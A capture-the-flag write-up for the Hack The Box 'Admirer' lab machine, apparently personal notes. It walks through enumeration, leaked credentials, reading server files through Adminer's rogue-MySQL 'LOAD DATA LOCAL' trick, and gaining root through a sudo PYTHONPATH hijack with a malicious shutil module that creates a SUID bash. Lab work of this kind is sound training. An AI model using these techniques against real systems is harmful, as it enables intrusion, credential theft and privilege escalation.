# Admirer machine
No information regarding the machine given

export IP=10.10.10.187

## 1 - nmap scan 

cmd: nmap -sC -sV -oN nmap/initial $IP

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

OPEN PORTS
```
21 -> ftp (later)
22
80 -> web server (enumerate)
```

## 2 - gobuster

cmd: gobuster dir -u "http://$IP" -w /usr/share/wordlists/dirb/common.txt -o gobuster/common

Results:
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/robots.txt (Status: 200) <---- check this
/server-status (Status: 403)
```

## 3 - check robots

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

## 4 - visit website

- Just images
- Allows to contact (maybe xss?!?!)
  - On the page source it does not send anywhere, so no xss

## 5 - try brute ftp
No valid accounts found

```
21/tcp open  ftp
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 7636 guesses in 601 seconds, average tps: 12.4
```

## 6 - Gobuster round 2

Issue the gobuster on the directory shown in the robots.txt "/admin-dir" and specify the extensions to check for files aside from pages


cmd: gobuster dir -u "http://$IP/admin-dir" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -o gobuster/common -t 40 -x txt,php,html

NOTE: just added more threads to speed up the process

Results
```
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
```

## 7 - Files contents

Credentials 
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Contacts

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb

```

## 8 - FTP files

Used creds 

```
USER: ftpuser
PASSWORD: %n?4Wz}R$tTF7
```

Files:
```
Website backup compressed.
sql dump for table items (images)
```

## 9 - website backup

some interesting files in the utility-scripts folder<br>
all except db_admin (DB access) can be accessed<br>

admin_tasks.php might be injectable but the task is extrictly compared to the numbers which need to match that value... 

Since the db_admin is not accessible, as the comment in the bottom suggests, it might have other db implemented... Lets fuzz it trying to find more pages.

cmd: gobuster dir -u "http://$IP/utility-scripts" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -o gobuster/common -t 40 -x txt,php,html

RESULTS: just found info.php with the common list.

lets try a different tool called wfuzz.
cmd: wfuzz -c -t 100 -u http://$IP/utility-scripts/FUZZ.FUZ2Z -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt --hc 403,404 -z list,php-txt-html

RESULTS:
```
adminer-php <- Database access
info-php
phptest-php
```

## 10 - trying to access DB

From the dump.sql in the ftp we have the database<br>
From the utility-scripts we have possibly used credentials

```
USER: waldo
PASSWD: Wh3r3_1s_w4ld0?
DB: admirerdb
```

It wont connect, the password is wrong! lets search for Adminer vulnerabilities
<br>
Vulnerability found: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool

```
1- the attacker will access the victim’s Adminer instance, but instead of trying to connect to the victim’s MySQL database, they connect “back” to their own MySQL database hosted on their own server.

2- using the victim’s Adminer (connected to their own database) – they use the MySQL command ‘LOAD DATA LOCAL’, specifying a local file on the victim’s server. This command is used to load data from a file local to the Adminer instance, into a database. Using this command, the specified file is read by Adminer and then sent to be stored in the victim’s database.

3- The attacker, using the victim’s Adminer, disconnects from his own database and connects to the victim’s database using the credentials they have just obtained. With access to the database they could read sensitive information, such as customer details. However, they could also write to the database – including potentially malicious JavaScript could be written into database fields which the eCommerce
application would later use to dynamically render pages on the site.
```

## 11 - Port redirection

Since the bind-address of mysql is to 127.0.0.1 we need to map the interface of the VPN to the localhost:3306 
<br>
This avoids to revert changes with bindings to all addresses (0.0.0.0:3306) on the mysql configurations.

```
sudo socat TCP-LISTEN:3306,fork,bind=10.10.15.104 TCP:127.0.0.1:3306
```

## 12 - access through the target box

After get access it is needed to load a file that thorugh the mentioned method in the vulnerability into the locally created table
<br>
First lets test a file inside the utility-scripts directory
```
cmd: LOAD DATA LOCAL INFILE '/var/www/utility-scripts/admmin_tasks.php'  INTO TABLE exp FIELDS TERMINATED BY '\n';
```

Got an error

```
Error in query (2000): open_basedir restriction in effect. Unable to open file 
```

Lets check the phpinfo.php script that was in the folder (http://10.10.10.187/utility-scripts/info.php)

```
open_basedir	/var/www/html	/var/www/html
```

Lets try the index.php to see if the credentials are there (as in the backup in the ftp)

```
cmd:
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE exp FIELDS TERMINATED BY '\n';
```

It did !!! 
<br>

```
creds
$servername: localhost
$username: waldo
$password: &<h5b~yK3F#{PaPB&dA}{H>
$dbname: admirerdb
```

## 13 - connect in the page to check

Only contains data for the images like in the dump..

## 14 - try ssh with the creds

They work, great!

```
cat ~/user.txt
FLAG: bbaefc72bbe961cbbfb8c4b942ba70d1
```

## 15 - Check sudo -l

The user waldo can run SETENV as root which means that he can set environment variables with root privileges.

## 16 - i got stuck

Since i got stuck, i went ahead and tried to figure out how to abuse this sudo SETENV.
<br>
The channel ippsec had this room solved so i watched it.
<br>

His idea was to abuse the backup script by setting the python path to a folder controlled by waldo's account, create a fake library with the method make_archive.

<br>
This method will create a reverse shell instead of making the actual backup

Backup file
```
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

My approach:<br>
instead of making a reverse shell, just create a copy of /bin/bash and set the suid bit...

```
mkdir /tmp/exp
vi /tmp/exp/shutil.py
sudo PYTHONPATH=/tmp/reckt admin_tasks.sh
```

Script code
```
import os
def make_archive(a1, a2, a3):
        os.system("cp /bin/bash /tmp/reckt/root; chmod +s /tmp/reckt/root");
```

NOTE: a symlink would also work


## 17 - root

```
whoami
root

cat /root/root.txt
FLAG: 6024cb1b55bfcff6d3f1d978db5fd9d4
```








